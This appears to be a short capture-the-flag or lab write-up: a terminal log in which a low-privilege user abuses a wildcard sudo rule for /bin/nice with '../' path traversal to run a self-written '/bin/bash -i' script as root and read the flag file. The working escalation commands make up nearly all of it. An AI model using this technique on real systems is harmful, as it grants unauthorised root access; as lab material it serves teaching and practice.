# Privilege Esc via Sudo Path Traversal via Incomplete Canonicalisation

```bash
webadmin@serv:~$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh
uid=0(root) gid=0(root) groups=0(root)

webadmin@serv:/notes$ ls -la
total 16
drwxr-xr-x  2 root root 4096 Aug  2  2020 .
drwxr-xr-x 21 root root 4096 Sep 28  2020 ..
-rwx------  1 root root   11 Aug  2  2020 clear.sh
-rwx------  1 root root    8 Aug  2  2020 id.sh

webadmin@serv:/notes$ cd /home

webadmin@serv:/home$ ls
florianges  webadmin

webadmin@serv:/home$ cd webadmin/

webadmin@serv:~$ echo "/bin/bash -i"
/bin/bash -i

webadmin@serv:~$ echo "/bin/bash -i" > root.sh

webadmin@serv:~$ sudo /bin/nice /notes/../../../../home/webadmin/root.sh
/bin/nice: ‘/notes/../../../../home/webadmin/root.sh’: Permission denied

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh
/bin/nice: ‘/notes/../home/webadmin/root.sh’: Permission denied

webadmin@serv:~$ chmod +x root.sh 

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh

root@serv:/home/webadmin# whoami
root

root@serv:/home/webadmin# cat /root/proof.txt
92225bf8539c4ec40515bc41165ab6ad
```